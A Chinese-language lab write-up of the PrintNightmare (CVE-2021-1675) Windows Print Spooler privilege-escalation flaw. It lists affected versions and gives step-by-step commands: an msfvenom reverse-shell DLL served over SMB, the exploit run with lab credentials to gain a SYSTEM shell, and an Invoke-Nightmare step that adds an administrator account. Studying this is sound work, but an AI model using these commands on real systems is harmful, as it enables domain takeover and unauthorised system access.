# Windows Print Spooler权限提升漏洞

Print Spooler是打印后台处理服务，即管理所有本地和⽹络打印队列及控制所有打印⼯作。该服务对应的进程以System权限执行，其设计存在一个鉴权代码缺陷，导致普通用户可以通过RPC触发RpcAddPrinterDriver绕过安全检查写入恶意驱动程序。如果域控存在此漏洞，域中普通用户即可通过远程连接域控的Print Spooler服务，向域控添加恶意驱动，从来控制整个域环境。



**影响版本：**

```
Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core
installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core
installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows 10 Version 21H2 for x64-based Systems
Windows 10 Version 21H2 for ARM64-based Systems
Windows 10 Version 21H2 for 32-bit Systems
Windows 11 for ARM64-based Systems
Windows 11 for x64-based Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server 2022 Azure Edition Core Hotpatch
Windows Server 2022 (Server Core installation)
Windows Server 2022
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
```



参考https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html

利用成功的三个先决条件：

1. 在目标系统上启用打印后台处理程序服务
2. 与目标系统的网络连接（已获得初始访问权限）
3. 低权限用户（或计算机）帐户的哈希值或密码

攻击方式1(使用https://github.com/cube0x0/CVE-2021-1675)：

首先检查目标是否开启MS-RPRN：

```shell
python3.10 rpcdump.py @10.10.10.237|grep "MS-RPRN"
Protocol: [MS-RPRN]: Print System Remote Protocol
```

如果开启了说明可能存在漏洞，拿msf生成一个反弹shell的dll：

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=39502 -f dll > msf-reverse-shell-39502.dll
```

启动一个smb服务：

```shell
cp ~/many-ctf/Ma\!/msf-reverse-shell-39502.dll ./share
python3.10 smbserver.py share ./share

#进行攻击
python3.10 CVE-2021-1675.py atom/jason:'kidvscat_electron_@123'@10.10.10.237 '\\10.10.14.14\share\msf-reverse-shell-39502.dll'

[*] Connecting to ncacn_np:10.10.10.237[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.14\share\msf-reverse-shell-39502.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
Traceback (most recent call last):
```

虽然攻击脚本那边会报错，但是nc这边成功拿到shell：

```shell
nc -lv 39502
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```



攻击方式2（使用https://github.com/calebstewart/CVE-2021-1675）：

```shell
upload CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1

#在Administrators组中创建一个feng用户。
Invoke-Nightmare -NewUser "feng" -NewPassword "fengfeng123!!!"
```

